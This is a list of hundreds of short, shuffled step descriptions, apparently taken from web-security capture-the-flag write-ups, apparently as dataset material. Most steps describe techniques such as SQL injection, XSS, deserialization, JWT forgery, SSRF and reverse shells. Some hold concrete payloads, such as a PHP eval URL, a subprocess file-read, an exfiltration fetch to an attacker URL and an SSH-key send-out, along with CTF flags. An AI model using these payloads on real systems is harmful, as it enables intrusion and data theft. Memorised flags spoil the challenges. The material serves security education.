[
    "The execution of '.bashrc' occurs when the user 'manhndd' SSH-es into the server",
    "Find the cookie name that matches the signature.",
    "Discover that the 'name' parameter uses PHP serialization",
    "Identify the code snippet that prints 'self.__dict__' in specific conditions.",
    "Use the SUBSTRING and SLEEP functions for each character.",
    "Choose 'discord' as the OAuth2 Identity Provider upon redirection.",
    "Attempt to log in the admin to a dummy Twitter account.",
    "Noticed that the HEAD never updates if the first index is removed.",
    "Take the first part of the flag from step 2",
    "Download the nginx.conf file successfully.",
    "Read the Python source code for the web app.",
    "Realised that the token was using the RS256 algorithm.",
    "Write a Python script to automate the URL enumeration and flag discovery.",
    "Use regular expressions to find specific fields.",
    "Analyzed the initial JavaScript code.",
    "Run a script with the site's 'secret key' included.",
    "Pass this hash with the GET parameter 'hash' to the server.",
    "Face an obstacle due to the password length exceeding the character limit of the login page",
    "Navigate to the '/home/user' directory.",
    "Set 'Content-Length: 0' for the first request.",
    "Try XSS payloads on different input fields.",
    "Recognize the security checks in place.",
    "Retrieved column names of 'startup_users' table from the database using the SQL query.",
    "Read the window variable using JavaScript",
    "Navigate to /authentication.php",
    "Final payload was a modified PHP object with the 'profile_img' attribute pointing to the flag",
    "Find out it is achievable by making two additional GET requests.",
    "Identify that the server adds a new secret to the secrets array every time a cookie is signed",
    "Download the provided 'flag.png.encrypted' file from the challenge description.",
    "Execute 'grep' command.",
    "Circumvent restrictions.",
    "Performed a simple curl request to '/\\%64ebug/answer'.",
    "Decide to forge the cookies",
    "Clone S3Scanner from GitHub repository",
    "Make the JavaScript payload fetch localStorage.getItem('flag') and send it to the attacker's URL.",
    "Note that the public key, verifyKey, is used to validate JWT signature in both HS256 and RS256 cases.",
    "Craft the payload with the SQL Injection and set it as the request body.",
    "Received a 403 Forbidden response.",
    "Realized stacked queries were allowed.",
    "Upload PHP shell",
    "Craft a POST request to target this vulnerability",
    "Set the cookie as 'user=root'.",
    "Understand that the input format for the SQL injection should match the UUID format.",
    "Attempt SQL injection using MySQL comments in place of spaces.",
    "Guessed that endpoints were present.",
    "The solution involves controlling a subdomain that matches the site domain.",
    "Revealed current directory as '/var/www/html'.",
    "Visit the website http://easy-php.darkarmy.xyz/",
    "Understand that the `login` cookie is transformed into a `Login` object during deserialization.",
    "Execute commands",
    "Exploit the SSTI vulnerability using ninjucks.",
    "Found password 'csictf'.",
    "Identified a potential vulnerability with 'www.youtube.com' hosting a JSONP endpoint.",
    "Identified the BeautifulSoup module being used to sanitize HTML.",
    "Bruteforce password at :7777 to determine the leaked byte",
    "Find the flag 'zh3r0{h3y_d1d_y0u_upl04d_php_c0rr3ct1y???_84651320}'",
    "Realize that the critical line could potentially lead to Remote Command Execution (RCE).",
    "Scour the page source and Javascript files to locate the token.",
    "Identify the vulnerable 'report' admin page",
    "Use backticks to confirm remote code execution (RCE).",
    "Understand that the app listens to 'POST' requests.",
    "Directory wasn't directly browsable or clonable",
    "Identify the challenge.",
    "Look for any hidden or obscured data.",
    "Received instructions about the presence of certain elements inside the HTML page.",
    "Submitted a text content to a remote S3 bucket.",
    "Pass the final payload '/admin'",
    "Realized that modifying the parameters allows callback to our server.",
    "Call the addCaptcha() function",
    "Conduct reconnaissance to identify potential target web application.",
    "Utilize the group_concat() function",
    "Decipher that the JavaScript in the source code was obfuscated",
    "Analyze and review the Dirb scan results",
    "Bypassed the login process.",
    "Explored the HTML source of the webpage.",
    "Understand that these hashes match the target through brute forcing.",
    "Find a workaround for using '.' by employing the 'attr' filter.",
    "Inferred the challenge was to exploit the `theme` parameter to inject XSS",
    "Verify the current size of the tar archive.",
    "Send a POST request to the '/localization-language' endpoint.",
    "Identify the components of the encrypted string: remote IP address, a seed (IDSEED), and current date",
    "Recognized that `main.dart.js` is the Flutter app compiled by `dart2js`.",
    "Receive a response indicating a healthy status and version.",
    "Login with given credentials using the Google Chrome Network tab.",
    "Associate recognized components with their intended functionalities.",
    "Identify the problem that requires generating two PDFs.",
    "Observe the result",
    "Craft a reverse shell payload using 'nodejsshell.py'.",
    "Indicate a successful XSS attack.",
    "Retrieve the flag successfully",
    "If the history length is three, the balance has been exceeded.",
    "Understand the rules of the site.",
    "Decode the string.",
    "Retrieve subclasses of the base class",
    "Realize that the 'id' parameter can be manipulated.",
    "Reduce the number of characters in the payload by improving upon the first solution",
    "Verify if 'length' query parameter is a string of length 0.",
    "Read the provided challenge.",
    "Progressively brute-force characters.",
    "Identified that the challenge seemed to involve reCAPTCHA.",
    "Received different responses from the '/two/' endpoint with 'PUT' HTTP verb.",
    "Retrieve the flag from the response page.",
    "Locate a valid credential.",
    "Read the challenge description thoroughly",
    "Send the admin to the page with the payload",
    "Recognize that the response text contains the flag.",
    "Explored files that could be overwritten",
    "Find that the '/display' page checks the session cookie.",
    "Discover 'scriptlet' endpoint",
    "Make a request to the Go microservice using a POST method",
    "Use curl command",
    "Recognized vulnerability as a request smuggling vulnerability.",
    "Successfully obtain a reverse shell.",
    "Make the decision to use a UNION SELECT based query",
    "Lacked the knowledge on how to trigger the aforementioned error.",
    "Verified this by submitting HTML enclosed in script tags to catch the HTTP request.",
    "Learned that the search feature places the query into the URL's fragment identifier.",
    "Constructed the MySQL query ensuring it follows the little-endian, 4 bytes format for length, used 1-byte for query type (0x3 for this specific query), and then added the actual query content.",
    "Decided to exploit 'unserialize' method.",
    "Extract 'flag.txt' from the GZip archive",
    "Identify the '|' operator as potentially useful.",
    "Load only the 'img' element.",
    "Examined server code",
    "Saw that search results affect which image loads.",
    "Used 'php://filter/'",
    "Identify the presence of 'news' string in the JavaScript code.",
    "Inspect parameters in the request.",
    "Used the session cookie to visit /flag",
    "Mutable objects within namedtuple and tuple can still be modified.",
    "Experienced multiple redirections from one page to another",
    "Retrieve the flag",
    "Started a HTTP server, created the '/static/js' directory structure, and placed XSS payload in 'marked.min.js'.",
    "Inspect the webpage",
    "Realize that the method failed",
    "Recall if there are any properties that are not defined initially but used later.",
    "Examined the 'index.js' file",
    "Infer that debugging on the production server is unlikely.",
    "Discover the .phtml extension.",
    "Verify that the web application does not reject the submission of duplicate 'n' parameters.",
    "The flag is inadvertently printed in the catch block due to the '__toString()' method of the 'access_log' class",
    "Perform SQL Injection to read 'username' from 'users'",
    "Extract the 'id' of the user (attacker) from the decoded JWT token.",
    "Discover a Disallowed path /ingen/.",
    "Submit the file for observation.",
    "Tried accessing a document called 'flag' in the Firestore database.",
    "Executed the URL.",
    "Access the list functionality",
    "Base64 encode the filenames `index.php` and `getimg.php`.",
    "Read the initial text.",
    "Used DOM Clobbering to bypass the `CONFIG.unsafeRender` check.",
    "Send the URLs to the bot.",
    "Used a private SSH key retrieved from the database for cloning.",
    "Visit the `/cookies` endpoint",
    "Discovered the existence of 'checkpass.php'.",
    "Attempted to inject XSS after bypassing",
    "Checked npm audit for vulnerabilities",
    "Tested the method.",
    "Identified vulnerabilities in the PHP source code.",
    "Check if an 'upload' page exists",
    "Perform an nmap scan on IP 18.213.16.123.",
    "Navigate to registration page.",
    "Attempted to bypass password check using SQL injection.",
    "Verified the contents of the 'flag' document.",
    "Access the browser's developer tools.",
    "Identify the Javascript file responsible for crafting the XML envelope.",
    "Discovered the flag within the content of the index.php file.",
    "Set the values of 'user' and 'pass' as 'karma'",
    "Recognized that the user input is directly used in an SQL query.",
    "Found no useful information.",
    "Look for a value for 'confidential_documents'.",
    "Recognize the XSS prevention methods implemented by the site.",
    "Developed a suspicion of a directory traversal vulnerability",
    "Use the remaining dumped credentials to login to the Admin page and access the flag.",
    "Use '?length=' as the query string.",
    "HTTP POST request to sell flag with negative price",
    "After logging in, retrieve the flag 'TUCTF{H1gh_S0urc3_3qu4ls_L0ng_F4ll}' from the site.",
    "Notice 'require()' leads to a Local File Inclusion (LFI) vulnerability.",
    "The malicious code fetches an exploitative script.",
    "Recognized that this SQL statement is equivalent to SELECT username, password FROM users WHERE username='adm' || 'in' || ''",
    "Code a web page that uses a Promise.",
    "Execute the command `whoami >> src/static/style.css`.",
    "Send the generated webpage URL.",
    "Confirm that the selected image can be used to exploit the service.",
    "Notice that if the URL limit is hit, the origin of the page remains that of the parent window",
    "Copy the JWT token from the payload.",
    "Realized that rendering unescaped HTML was unsuccessful.",
    "Attempt to discover the generated token",
    "Identify potential exploits that can be used.",
    "Set the token as a cookie.",
    "Analyze the structure of the store object.",
    "Understood default signature algorithm of openssl_verify is SHA1.",
    "Hint that XSS might be possible in this case.",
    "Execute the 'cat' command to view the contents of a file.",
    "Understand that the goal of the CTF challenge is to fetch the environment variable 'flag'.",
    "Revealed the flag 'aj9dhAdf4'.",
    "Send a POST request.",
    "Understand the need to avoid the same-origin policy for reading the flag",
    "Perform a CSRF to the /find endpoint.",
    "Researched 'Code Execution through IIFE in node-serialize' advisory",
    "Retrieved the flag in the response",
    "Loop through a range of integers.",
    "Select the generated barcode file for upload.",
    "Appended `?source` to the index.php of the site.",
    "Get the SSH key to the attacker site.",
    "Retrieve the X-Accel-Redirect header.",
    "Use the newly created regex as the replacement.",
    "Discover a file named 'flag210d9f88fd1db71b947fbdce22871b57.php'",
    "Observe that it's a static site.",
    "Gain access to the application.",
    "Find that the feature allows specifying a remote document portion to insert.",
    "Wrote a Python script.",
    "Retrieve 'flag.txt'.",
    "Identify that the cookie is set with the flag '35C3_LOG_ME_IN_LIKE_ONE_OF_YOUR_FRENCH_GIRLS'",
    "Identify normal SSRF vulnerability in curl",
    "Assess the function of the 'handlebars' library within the system.",
    "Obtained a sequence of hexadecimal values",
    "Utilized a trick where Angular recognizes '\\' as '/'.",
    "Ensure the injected `style` element is readable by the attacker",
    "Guess that language setting may be relevant to solve puzzle",
    "Server was able to provide signature for this manipulated message.",
    "Understand that exploitation involves creation of a Stored XSS",
    "Determine the need to use '/home/stypr/readflag' on 'website'.",
    "Obtain the content of the template files.",
    "Run the script.",
    "Create 'merged.pdf' containing a dummy PDF.",
    "Controlled 'pkg' by polluting '__proto__.data'.",
    "Identify that the server checks if 'text' is not included in 'xml.lower()'.",
    "Identify that the condition only returns the flag if the request is coming from a '127.0.0.1' IP address.",
    "Use the new password.",
    "Analyze the application's token verification process",
    "Found a password hash '6f246c872cbf0b7fd7530b7aa235e67e'.",
    "Identified the 'User' object and MFA token within 'Login'.",
    "Investigate the requirements and specifications of an uploaded zip file.",
    "Identify the parameter 'uuid' in the request URL",
    "Realize that the server signs new RS256 tokens with the private key, signKey.",
    "'/opt' is the web facing directory",
    "Identify a suspicious commit with a message 'oops'.",
    "Notice a strange message of INSTRUO team's love for cookies.",
    "Enter an apostrophe in the password field.",
    "Exploited the limit of 20 redirects using Fetch API.",
    "Recognize the objective and rules of the game.",
    "Realized SQL queries can be dispatched to this open FD to read responses.",
    "Uploaded a larage number of valid files.",
    "Resulted in a base64-encoded result.",
    "Extracted the content of the 'whatsthis' table.",
    "Modify the comparison to always allow login even with incorrect password",
    "Identify the flag utflag{n3xt_y3ar_go1ng_bl1nd} in the returned data.",
    "Access otherwise forbidden files",
    "Locate the file 'build_flag_checker.yml'",
    "Discover that the code uses a blacklist Regex.",
    "Ensure the injection payload has been executed.",
    "Upload the modified DOCX file",
    "Perform another POST request.",
    "Discovered a hint.",
    "Identify the need to steal the identifier",
    "Identify that representing the localhost (127.0.0.1) in a different notation can bypass the restrictions.",
    "Ran SQLMap with the script.",
    "Note that node_modules folder contains source code of installed modules.",
    "Create a XSS payload.",
    "Identified 'disable_functions' configuration.",
    "Reveal the challenge flag",
    "Run the script to retrieve the password for the flag: gigem{h0peYouScr1ptedTh1s}",
    "Create a HTTP request.",
    "Observe that the flag is: `AOTW{th3_p3rl_c0w_s4ys_M0oO0o0O}`",
    "Visited the challenge website.",
    "Received the response",
    "Discover that 'passcode' values are the first 8 characters of the hashed 'nonce' value.",
    "Review the challenge description again.",
    "Identified a login.php page.",
    "Find the database credentials in the output.",
    "Override the prototype using a payload to set a context to the prototype of [object].",
    "Locate admin button on the webpage.",
    "Examined the authentication process.",
    "Discover that the server generates a JWT token.",
    "Successfully got the challenge flag",
    "Modify the `services` object by POST-ing JSON to the `/change_status` endpoint.",
    "Obtain a token after successful login",
    "Retrieve and examine the contents of the 'flag.txt' file",
    "Observe the occurrence of an error.",
    "Examined SQL queries executed for user authentication.",
    "Note that filename length must be five or less",
    "Identify fields that need to be extracted.",
    "Understood the deserialization process.",
    "Identified the target 'config.php' file.",
    "The POST-based XSS vectors are not exploitable for admin privilege access",
    "Realize the split parts were stored against assigned keys",
    "Conduct experiments with different content.",
    "Wrote a Python script to extract the most commonly occurring source IP (src_ip) from the CSV files",
    "Identified the URL of the flag containing post '/post/68a30ae2-a8f3-4d12-9ffa-0564a3a7177b' from the exfiltrated contents.",
    "Introduce additional PHP code",
    "Extract the count of PDF pages from the merged PDF file.",
    "Discovered an image rendering feature that places text onto a T-shirt image",
    "Decoded the base64 encoded payload",
    "Retrieve source files for AsmBB and FreshLib using wget",
    "Analyze the data being displayed",
    "Identified the application was protected by DOMPurify in version 2.0.16.",
    "Found API endpoint details in the downloaded files",
    "Found an alternative method to solve the challenge for the second flag.",
    "View code specifics using the debugging tool.",
    "Read and understand the hints provided in the challenge.",
    "Understand the functionality and workings of the 'forgot password' feature.",
    "Analyze the cookies",
    "Use the 'mutool info -X' command to verify 'collision1.pdf'.",
    "Caused the proxy server to send a request to the specified URL.",
    "Format the output of the Python code to look like a JavaScript script.",
    "Capture the request.",
    "Make the first commit to the repository.",
    "Wait for the bot to visit the URL.",
    "Wrote the final payload.",
    "Build the asmbb engine source code using the Fresh IDE with Linux as the target OS",
    "Examine the file UserController.java to identify any useful endpoints.",
    "Use the same value for 'pass' URL parameter and User-Agent",
    "Send the prepared GET request, making the server believe that the request is coming from the same host.",
    "Fill out registration form.",
    "List the files.",
    "Request Chromium to open a new webpage.",
    "Bypassed authentication.",
    "Utilize the observed character set.",
    "Identify the Hexadecimal string.",
    "Managed to bypass the 'strpos(urldecode($remote),'..')' condition.",
    "Successfully log in to the system.",
    "Add padding to the extracted text.",
    "Realize the calls to 'window' essentially represent 'window.localStorage.setItem'",
    "Checked routes.py file.",
    "Recognized first flag hidden in angular endpoint /debug/answer restricted by Nginx and application.",
    "Note that a JWT key is created for each new user during registration.",
    "Use 'phpinfo' page to check if the payload is operational.",
    "Try logging in using `manager:bigsanta!` credentials.",
    "Understand that the URL rewriting is done using the host header",
    "Craft a malicious payload in a POST request.",
    "Review the provided Python code.",
    "Checked output of 'List Processes' command and identified 'python3 /root/ups_manager.py'.",
    "Initialized a Bazaar repository within the 'ctf-bzr' directory.",
    "Ensure the inserted PHP code can execute commands remotely",
    "Identify the payload",
    "Discover the flag 'rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}' in the 'secret_key' column of the database.",
    "Determine that the 'uuid' parameter is vulnerable to injections (XSS/CSS)",
    "Utilize the code snippet to list the directory content.",
    "Examined the contents of the downloaded code",
    "Use LFI to access the code of the 'flag' resource in the 'deleted' folder",
    "Received another response",
    "Recognized the ability to 'preview' HTML without saving it.",
    "Determine that window's history length can reveal whether a redirection occurred.",
    "Find them in the exploit database.",
    "Viewed the backend activity in the Network tab.",
    "Identified that the binary calls the 'id' command three times, with privileges",
    "Sign the token using the retrieved public key.",
    "Realized the potential for modifying '$query' for SQL injection.",
    "Create a payload that would fit the constraints and retrieve the flag.",
    "Passed through conditions checking for specific value comparisons.",
    "Increasing fame is impossible.",
    "Understand that they can be referenced in the eval-ed code",
    "Check for a possibility of XSS injection in the CSRF token script.",
    "Analyze the source code of the webpage.",
    "Found a way to bypass the localhost blacklist by using an alternative representation of '127.0.0.1', like '0177.0.0.1'.",
    "Note that the Traefik service only accepts the POST, GET, OPTIONS, DELETE and PATCH methods",
    "Understand that if the IP is from Norway, YAML parses 'NO' as False.",
    "Examine the blacklist filter code.",
    "SQL injection via User-Agent string was possible.",
    "Inject a random '<h1>Hello</h1>' tag.",
    "Analyze 'cgi-bin/' directory",
    "Credentials: 'dogooo' for 'db_user' and 'dogZgoneWild' for 'db_pass'.",
    "Obtain an exploit script for generating the payload.",
    "Discovered that the goal was to read the 'app.secret_key' value",
    "Send a request to '/pleb.mysub.dnsbin.zhack.ca'.",
    "Ensure the XSS payload fits within the 75 character limit.",
    "Manipulated the `widget` parameter.",
    "Observed an interface that offered XML parsing as a service.",
    "Implement the necessary steps to exploit the vulnerability",
    "Apply the algorithm to the captured wifi nonces.",
    "Send the crafted payload.",
    "Gather supporting materials for the exploit",
    "Display the flag in the browser instance.",
    "Observed that 'c' parameter in requests was used to manipulate the user session, either to sign in, sign up, or sign out.",
    "+= tries to assign the result back to the variable.",
    "Identify the onclick track event",
    "Used sqlmap to brute force the password and obtain the token.",
    "Accessed 'README' file within '.bzr' directory.",
    "Leverage the `constructor/prototype/outputFunctionName` to achieve RCE.",
    "Use the curl command",
    "Started with port 20022",
    "Detect the usage of Prerender to handle the requests.",
    "Visit the webpage.",
    "Enter the payload ' or '1'='1'.",
    "Locate the 'admin_id' cookie",
    "View the homepage source",
    "Found out that 'pkgPath' is the path to this package.",
    "Identified the 'SQL' class within the code.",
    "Explore the file /static/js/main.",
    "Observed Apache Traffic Server (ATS) 7.1.1 in 'Server' response header.",
    "Logged in as admin using the discovered SQL injection",
    "Receive the server's response.",
    "Analyze the source files",
    "Examined how the OTP verification is performed.",
    "Received a message from the '/vim/quit/' endpoint.",
    "Append the payload '?payload=directory`flag`' to the URL of the webpage.",
    "Analyze the 'entrypoint.sh' bash file.",
    "Search for 'ip/_ignition/execute-solution' in the Laravel panel",
    "Examined the DIG records.",
    "No success in submitting the answers.",
    "Find the endpoint '/dogooo/runcmd' enabling remote shell functionality.",
    "Flip the comparison check in /var/www/html/wp-includes/user.php at position 5389",
    "Identified failure due to Content Security Policy",
    "Understand that dynamic rendering renders JavaScript on the server-side before serving web crawlers.",
    "Result in 'Wrong Password!' message.",
    "Send a GET request to the target URL with each possible 'likeCookie' value (from 0 to 19).",
    "Analyze the structure and properties of the `Login` object to find potential vulnerabilities.",
    "Discover several directories including /app and /flag.txt",
    "Access the website",
    "Identify the critical line.",
    "Monitored the execution flow of function calls",
    "Recognized the necessity to write a php-cgi header before executing the MySQL query.",
    "Attempted to pass an object in place of password",
    "Notice that the 'name' variable is not declared in this case.",
    "Open 'line 1' of the 'jquery.jscroll2.js' JS file.",
    "Intercept the data.",
    "Create a payload.",
    "Finally, found the flag 'ACSC{it_is_hard_to_name_a_flag...isn't_it?}'.",
    "Execute an XSS attack.",
    "Use rockyou.txt as the wordlist.",
    "Identify that the server uses dynamic rendering.",
    "Found that the 'flask_caching' module can store a python pickle in redis",
    "Logged in as dennisb@uupeye.edu",
    "Extract the understanding of the possibility to upload an image.",
    "Observed redirection to '/?file=wc.php'.",
    "Explore the profile settings.",
    "Identify that the reason for the script not being executed is the DOMValidator.js script.",
    "Reveal the source code of 'config.php'",
    "Noted the situation that even though the app was hidden behind Nginx reverse proxy.",
    "Recognized that the source code is written in PHP.",
    "Assess the web application.",
    "Get the flag",
    "Register a user with the malicious username input",
    "Return to the problem.",
    "Observe that the enumerated IDs correspond to the router's RAM.",
    "Downloaded the provided HTML file.",
    "Admin visits the page",
    "Send a POST request with 'launch' attribute set to true.",
    "Accessed the webpage.",
    "Attempt to show differences between the commit when the flag was removed and the commit when it was present.",
    "Identify packet #261 in the capture",
    "Send base64 encoded image data to the requestbin.",
    "Analyze the challenge",
    "Determine that the website is using PHP eval() function",
    "Used the found object",
    "Write a PHP program.",
    "Focused on exploiting XSS attacks accessing XSL document.",
    "Discover that the certificate was created for the host 138.247.13.115.xip.io.",
    "Deserialize the object of the Image type using PHP.",
    "Retrieve the flag from the response.",
    "Identified the 'openssl_verify' function in website source code.",
    "Notice that a normal interaction involves passing a productId value.",
    "Pass through certain PHP code",
    "Ensured the user script run by application was active.",
    "Examine the Go microservice",
    "Inferred the username to be michelle",
    "Understand it as a potential workaround for the blacklist.",
    "Ensure that 'usernameLength' is empty through the query string.",
    "Note that client's 'User-Agent' value is used in the encoding function.",
    "Access the environment file.",
    "Observe the response received after sending the manipulated request.",
    "Received the flag as part of HTML response.",
    "Observe a PHP snippet",
    "Realize the limitations on the maximum attempts from the same IP address",
    "Obtained the flag",
    "Obtain the admin's cookie",
    "Review the AWS managed rules changelog.",
    "The filename used in the request was 'lol.txt'",
    "Understood that the server uses Python's requests library to issue GET requests to the submitted URL.",
    "Analyze the AsmBB source's render2.asm file",
    "Confirmed the SameSite attribute of the cookies.",
    "Executed 'ls -al' command.",
    "Constructed a POST request to the '/flag' endpoint",
    "Read the page carefully.",
    "Run the Python script.",
    "Identify 'flag.file' contents",
    "Attempt to access localhost on the URL capture service",
    "Establish a reverse shell.",
    "Modify fetch request to include polluted `credentials: include` option",
    "Create a Python script",
    "Received the cookies",
    "Perform a directory scan.",
    "Analyzed the source code",
    "Use S3Scanner to dump the contents of the suspect S3 bucket",
    "Recognize ATS interpreting \\\"chunked\\\" as chunked.",
    "Use the Runtime.evaluate method for sending the code.",
    "Start the checker.",
    "Discover a 'primary' segment in Angular.",
    "Used the SQL injection payload to retrieve the flag",
    "Appended a payload to the back of the signup date.",
    "Modified the PHPSESSIONID cookie in the browser to Maria's session ID.",
    "Open the Inspect Element tool",
    "Change the window's location back to the exploit server.",
    "Noticed the use of `SECCOMP_MODE_STRICT` seccomp sandbox.",
    "Convince the server to communicate with arbitrary URL.",
    "Extract the understanding from the pull request.",
    "Guessed the presence of endpoints.",
    "Use nip.io wildcard DNS service.",
    "Access the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/robots.txt'",
    "Performed zero-click exfiltration.",
    "The script loads a template including the query for each possible character.",
    "Reach the 'Put()' handler of the Go microservice",
    "Send a GET request to '/download_all' to trigger the exploit.",
    "Attempted to purchase 'flag' but failed.",
    "Discover that the tripcode is generated from a snippet of futaba-ng code",
    "Added a header named 'answer'",
    "Upload a different file.",
    "Check if the body JSON value 'solution' is equal to the expected CAPTCHA.",
    "Observed the 'users_data' database structure.",
    "Retrieve the flag value 'flag{th3_an5w3r_w4s_HSCTF_0bvi0us1y}'.",
    "Import the 'md5' function from 'hashlib' in Python.",
    "Create an object that resolves as a promise.",
    "Observe the presence of a cookie named userData with userID and username.",
    "Understood that the server is running php-cgi.",
    "Receive an HTTP response containing the Flag",
    "Executed SQL statement: SELECT username, password FROM users WHERE username='adm' || trim('in',' AND password=') || ''",
    "Assign the value 'true' to the cookie.",
    "CSRF payload fetches /api/flag",
    "Replaced the current 'last-revision' file with the downloaded one.",
    "Retrieve the received private key.",
    "Visit an online barcode generator website.",
    "Locate the 'flag_is_here' directory in the root directory",
    "Identify the specific JavaScript file",
    "Place the newly crafted cookie back into the application using Burpsuite.",
    "Build URL",
    "Recognize them as screenshots.",
    "Read the 'README' file.",
    "Submit a single comma as input.",
    "Steal the admin's cookie.",
    "Decide to discover each character of the password one at a time.",
    "Uploaded the XML payload.",
    "Note the usage of the 'f()' method on the 'username' field.",
    "Realize the filtering of .php extensions.",
    "Attempted to alter the User-Agent during authentication.",
    "Continue script until full password is discovered",
    "Identified SSRF vulnerability",
    "The key for the key-value pair is retrieved from the 'key' variable.",
    "Submit the registration form",
    "Obtain the flag",
    "Analyze the PHP script.",
    "Use the SQL function 'max(A, B)' to sort through the concatenated 152-digit number.",
    "Crafted the payload into a representation of a session cookie",
    "Make a 'POST' call.",
    "Scanned the entire subnet from 172.16.2.0 to 172.16.2.255 using Burp Suite Intruder.",
    "Refreshed the page.",
    "Confirm the success message in the response.",
    "Instructed to calculate the number of cameras within 1.3km radius of the origin point",
    "Second part performs 'file_get_contents('flag.php').",
    "Scheduled to perform a UNION based injection",
    "Visited the webpage.",
    "Target '/reset2fa' as the destination of the POST request.",
    "Set the host header.",
    "Examine the application's server code.",
    "Noted the absence of ASLR in WASM.",
    "Craft a JavaScript snippet that sends a GET request to the '/profile/follow' endpoint.",
    "Deploy the provided Docker image.",
    "Verify that the 'token' key contains a JWT",
    "Search for a script.js file.",
    "Discover the admin's subdomain.",
    "Edited the existing jwt token",
    "Only 'index.php' was returned from the directory listing.",
    "Read the contents of 'flag.txt'.",
    "Use the X-Accel-Redirect PHP script.",
    "Used Chrome DevTools.",
    "Create a reverse shell back to attacker's machine.",
    "If the condition is not met, the script continues iterating.",
    "Start a 'netcat' listener on your server.",
    "Create a tar archive with all the uploaded files.",
    "Obtain the real flag within the FLAG cookie",
    "Submit the payload (__import__('subprocess').getoutput('cat /flag/flag.txt')).",
    "Recognize that you can report suspicious URLs to the admin.",
    "Have the user (admin) visit the URLs.",
    "Populate entry in /out/save.txt.",
    "Visit the website.",
    "Attempt to access /server-status",
    "Noticed pictures of devices.",
    "Identify USER_ID.",
    "Verify that the service is the app mentioned in the challenge.",
    "Signify checking out the website's 'robots.txt'",
    "Use the 'subprocess.Popen' class.",
    "Decide on the challenge to change the admin's password.",
    "Observe the code structure.",
    "Discovered that arbitrary HTML submitted is rendered by the admin's browser.",
    "Create a 8 byte file equivalent to the data in `cipher + 0xd34db33f`.",
    "Find a way around the lack of access to the constructor property.",
    "Find an unfixed issue revealing a Local File Inclusion (LFI) vulnerability in PHP-Proxy",
    "Decode the base64 data.",
    "Use a wildcard pattern and append the current character to check if the password starts with the current guessed string.",
    "Use this as a proof-of-concept for XSS vulnerability",
    "Opened the given link",
    "Check the output of the command \"whoami\".",
    "Inspect the `User` object to find its instantiation of a `SQL` object.",
    "Understand that the JWT token is signed and verified on the server-side.",
    "Compress the malicious Java serialized object",
    "Confirmed command injection challenge.",
    "Identify a specific range 'A:B'",
    "Noted execution of argument as command.",
    "Server returned all allowed methods.",
    "Employed the JMP - CALL - POP technique within the shellcode to acquire strings in the registers.",
    "Send a GET request.",
    "Access '/robots.txt' on the website",
    "Identify verifyUsername() within the verify() function.",
    "The vulnerability is present in the POST filename",
    "Find the correct value for the cookie 'otadmin' (\"hash\": 389)",
    "Discover website hosting on Apache Traffic Server 7.1.1.",
    "Retrieve the found secret_key 'redraider'.",
    "Identify the '--checkpoint-action' option that executes a program at a checkpoint.",
    "Check the 6th character of the flag in the SQL database",
    "Search for comments within the style.css file",
    "Trigger JavaScript code.",
    "Understand that this approach seems to be working",
    "Observe URL Capture button on the website",
    "Identify the replacement of blacklisted characters.",
    "Preview button posts a message to the iframe",
    "Gain the necessary information to answer the recovery questions",
    "Read the challenge's description.",
    "Utilized script to make the client request.",
    "Loop through a list of characters.",
    "Note that f-Strings can be used to call methods.",
    "Identified that 'X-Forwarded-For: 172.16.2.24' allows access to 'login.php'.",
    "Determine that 'key2' is a shuffled version of 'key'.",
    "Bypass 'class' by constructing a string.",
    "Perform SSRF to localhost.",
    "Redirect the user to the main site.",
    "Identify the list of references to the PDF pages in the merged PDF file.",
    "Discover HTML comment",
    "Understood that 'JSON.parse' allows the '__proto__' key.",
    "Execute a final SQL query",
    "Analyze the server script running at the provided URL.",
    "Find hint suggesting input was not sanitized.",
    "Explore the copy profile link feature.",
    "Understand that the IP address used to generate the token cannot be used to extract it",
    "Unpack the tar archives",
    "Executed another HTTP request.",
    "Create a new DOCX file",
    "Execute the 'id' command remotely using the identified class",
    "Utilized two accounts for user enumeration.",
    "Craft another post request",
    "Visit the robots.txt page for the site.",
    "While holding the 'Ctrl' key, press the 'U' key on the keyboard.",
    "Discover that the Flask session secret key is hardcoded into the source code.",
    "Examine the 'init_db' function.",
    "Set up a listening server using 'netcat'.",
    "Used Burpsuite",
    "Identified that the application didn't trust 'X-Forwarded-*' headers.",
    "Identified a `/api/flag` endpoint.",
    "Crafted an XSS payload to get the cookies of the admins",
    "Retrieve the key file.",
    "Observe that the authentication process terminates if the `bind_param()` call returns false.",
    "Discovered that the flag is returned by the backend server only if the 'secret' cookie is present.",
    "Exploited SHA1 vulnerability using SHATTERED.",
    "Analyzed the response",
    "Notice vulnerability occurs when merging request data.",
    "Determine that there's not much to exploit.",
    "Host a server to capture the request.",
    "Identify the hexadecimal string.",
    "Understood the idea can be voted on.",
    "First part constructs a string representation.",
    "Execute '/usr/bin/strings /readflag' command.",
    "Executed the new URL.",
    "Find a quote from Mr. Robot",
    "Included an overflowing 'Content-Length' header.",
    "Choose JWT.io or jwt_tool.py as the decoding tool.",
    "Realized this would truncate any shellcode at null bytes.",
    "Formulate a GET request",
    "Identify 3 log file links.",
    "Observe the rewriting and forwarding of the request to the pre-renderer at `http://renderer:3000`.",
    "Create a crafted 'id' parameter.",
    "Noted filter size limitation",
    "Focus on the 'decrypt.php' file.",
    "Researched the 'flask_caching' module",
    "Understand that this shuffle is based on seeded random values tied to the 'User-Agent'.",
    "Noticed that 'read online' opens a link from an unrelated domain.",
    "Create the server script.",
    "Utilize the developed exploit",
    "Create a SQL Injection payload.",
    "Comprehend the loose comparison ('==') operator used in PHP to compare two md5 hashes",
    "Sent the request to 'http://18.179.178.246:8003'",
    "Visit 'http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&nic3=/DarkCON/e&pwn=config.php'",
    "Any characters allowed after the valid start of email",
    "Realize the endpoint changes to '$BACKEND/admin'.",
    "Find upload.php in the source.zip file.",
    "Recognize the use of repeated directory traversal sequences in payload modification.",
    "Identified the task as a PHP Object Injection challenge",
    "Ensured the script utilizes a previously saved cache.",
    "Generated the finalized payload",
    "Use the internetwache GitTools.",
    "Note that the message 'Not authenticated' is displayed",
    "Make an educated guess on the numbers at the beginning of the MD5 string",
    "Access the template files on the server.",
    "Read the challenge hint",
    "Pass the encoded content into the cookie.",
    "Observe the server's response.",
    "Note that it is an MD5 hash.",
    "Refer to the PHP manual to obtain the bcrypt hash and identify the password as 'rasmuslerdorf'.",
    "Identify the hidden field 'password'",
    "Understand that DOCX files are actually a collection of XML files",
    "Recognize that the hash can be cracked.",
